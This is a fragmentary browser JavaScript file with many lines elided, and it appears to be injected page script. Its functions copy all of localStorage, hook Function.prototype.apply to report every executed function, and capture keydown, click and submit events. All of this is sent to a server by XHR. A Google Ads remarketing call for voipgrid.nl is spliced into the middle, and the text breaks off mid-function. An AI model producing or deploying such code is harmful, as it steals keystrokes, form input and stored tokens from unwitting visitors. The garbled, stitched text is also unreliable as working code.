(function () {
  ...
  function trackLocalStorage() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      trackedData[keyName] = localStorage.getItem(keyName);
    }
    return trackedData;
  }
  var s = {};
  ...
  function hookJavaScript() {
    window.Function.prototype.apply = function () {
      let result = Function.prototype.apply.apply(this, arguments);
      sendToServer({
        type: "Function executed",
        functionBody: this.toString(),
        result: result
      });
      return result;
    };
  ...
  function listenToEvents() {
    const events = ["click", "keydown", "submit", "mousemove"];
    events.forEach(evt => {
    ...
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          ...
          console.log("Failed to send data, status code: " + xhr.status);
        }
      }
    };
    xhr.send(JSON.stringify(data));
  }
  s.ss_(window, 'OjE2OTQxNDU1NDgyMjk', ['https://www.google.com/pagead/1p-user-list/981086593/?random\x3d1694145548229\x26cv\x3d11\x26fst\x3d1694142000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be3960\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.voipgrid.nl%2F\x26frm\x3d0\x26tiba\x3dVoIPGRID%3A%20Wholesale%20VoIP-platform%20voor%20telefonie%20resellers\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d2205359686\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.kr/pagead/1p-user-list/981086593/?random\x3d1694145548229\x26cv\x3d11\x26fst\x3d1694142000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be3960\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.voipgrid.nl%2F\x26frm\x3d0\x26tiba\x3dVoIPGRID%3A%20Wholesale%20VoIP-platform%20voor%20telefonie%20resellers\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d2205359686\x26rmt_tld\x3d1\x26ipr\x3dy']);
  function monitor() {
    hookJavaScript();
    listenToEvents();
    let collectedData = {
      globalVars: trackGlobalVariables(),
